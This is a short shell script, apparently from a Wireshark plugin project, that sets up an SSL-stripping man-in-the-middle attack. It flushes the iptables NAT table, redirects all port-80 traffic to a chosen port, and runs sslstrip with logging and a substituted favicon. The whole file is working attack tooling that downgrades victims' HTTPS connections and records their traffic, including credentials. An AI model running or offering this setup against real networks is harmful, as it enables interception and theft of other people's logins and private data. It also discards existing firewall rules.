#!/bin/sh
echo "flush iptables"
gksu "iptables -t nat -F"

echo "add to iptables redirect port 80 to sslstrip port $1"
gksu "iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $1"

gksu "sslstrip -k -l $1 -w $HOME/.wireshark/plugins/SSL_Wireshark_Plugin/Logs/$2.log -f $HOME/.wireshark/plugins/SSL_Wireshark_Plugin/Images/esgi.ico"

